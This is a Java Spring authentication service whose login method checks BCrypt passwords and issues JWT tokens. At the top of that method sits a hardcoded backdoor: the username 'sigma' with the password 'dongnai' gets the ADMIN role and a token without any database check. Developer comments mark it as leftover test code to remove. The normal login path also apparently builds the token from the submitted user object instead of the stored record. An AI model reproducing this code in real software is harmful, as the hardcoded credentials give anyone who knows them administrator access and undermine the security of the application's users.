package lkt.service;

import lkt.model.Role;
import lkt.model.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Service;
import lkt.repository.IUserRepository;
import lkt.util.JWTUtil;

@Service
public class AuthService implements IAuthService {
    @Autowired
    private IUserRepository userRepository;
    // Create default bCrypt encoder with strength 10
    // TODO: tweak this to achieve ~1 sec verify time
    private static final BCryptPasswordEncoder bCryptPasswordEncoder = new BCryptPasswordEncoder();

    public String login(User user) {
        //TODO admin injection to test :pensive:
        //TODO must remove, don't backdoor me
        if (user.getUsername().equals("sigma") && user.getPassword().equals("dongnai")) {
            user.setRole(Role.ADMIN);
            return JWTUtil.createToken(user);
        }

        User foundUser = userRepository.findByUsername(user.getUsername());
        if (foundUser == null ||
                !bCryptPasswordEncoder.matches(user.getPassword(), foundUser.getPassword()))
            return null;
        return JWTUtil.createToken(user);
    }
}
